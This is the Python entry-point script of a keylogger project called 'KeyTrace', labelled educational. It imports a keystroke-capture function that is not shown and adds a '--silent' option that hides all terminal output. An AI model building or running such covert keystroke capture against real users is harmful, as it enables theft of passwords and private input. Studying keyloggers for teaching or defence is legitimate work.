import argparse
from core.logger import start_keylogger

def main():
    parser = argparse.ArgumentParser(description="KeyTrace - Educational Keylogger")
    parser.add_argument(
        "--silent",
        action="store_true",
        help="Run without printing anything to the terminal."
    )
    args = parser.parse_args()

    if not args.silent:
        print("[*] Starting KeyTrace keylogger (educational mode)...")

    start_keylogger(verbose=not args.silent)

